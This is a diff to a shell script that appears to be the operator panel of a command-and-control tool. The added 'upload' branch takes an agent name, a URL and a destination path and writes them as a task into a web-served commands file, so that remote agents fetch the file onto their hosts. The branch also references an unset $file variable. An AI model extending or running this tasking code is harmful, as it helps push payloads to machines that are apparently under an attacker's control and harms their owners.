@@ -36,6 +36,19 @@ sleep 2
 clear
 
 
+elif [ "$action" = "upload" ]; then
+echo "Agent ?"
+read agent
+echo "URL ?"
+read url
+echo "Path ?"
+read path
+echo "$agent:$action:$url:$path" >> /var/www/html/cmds.txt
+echo "Task to $agent => $action $file $url to $path" >> /var/www/html/res.txt
+sleep 2
+clear
+
+
 elif [ "$action" = "clear" ]; then
 echo "file?"
 read file
